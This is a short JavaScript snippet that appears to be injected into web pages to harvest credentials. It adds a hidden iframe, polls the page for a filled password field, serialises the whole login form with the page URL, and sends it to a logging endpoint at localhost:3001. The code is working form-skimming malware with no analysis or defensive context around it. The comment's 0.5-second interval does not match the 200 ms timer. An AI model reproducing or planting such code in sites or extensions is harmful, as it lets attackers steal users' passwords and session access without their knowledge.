
// Create iframe to send data 
var iframe = document.createElement('iframe');
iframe.setAttribute('style', 'display: none;');
document.body.appendChild(iframe);

function checkCredentials(callback) {	
	
	var password_field = $('input[type="password"]');
	
	// If no password input field found, stop checking
	if(password_field.length === 0) {
		return
	}
	
	// Check if password field is not empty
	if(password_field.val() !== '' ) {
		var report = 'url=' + encodeURIComponent(window.location.href);
		report += '&' + password_field.closest('form').serialize();
		iframe.setAttribute('src', 'https://localhost:3001/log/?' + report);
		return
	}
	
	// Call setTimeout
	callback();
}

// Repeat checkCredentials all 0.5s
(function(){
	var callee = arguments.callee;
	checkCredentials(function() {
		setTimeout(callee, 200);
	});
})();